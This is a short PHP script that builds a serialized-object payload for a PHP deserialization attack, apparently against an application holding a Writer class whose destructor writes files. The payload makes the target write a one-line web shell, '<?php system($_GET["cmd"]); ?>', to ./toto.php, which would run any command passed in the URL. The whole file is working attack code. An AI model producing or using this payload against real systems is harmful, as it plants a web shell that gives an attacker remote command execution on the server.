<?php 

class Writer {
    public $path;
    public $content;
    
    
    function __construct($path = null, $content = null) {
        if ($path !== null) $this->path = $path;
        if ($content !== null) $this->content = $content;
    }
    
    
    function __destruct() {
        if (!empty($this->path) && isset($this->content)) {
            @file_put_contents($this->path, $this->content);
        }
    }
}

class Container {
    public $w;
}


$a = new Writer();
$a->path = "./toto.php";
$a->content = '<?php system($_GET["cmd"]); ?>';

echo serialize($a);

?>
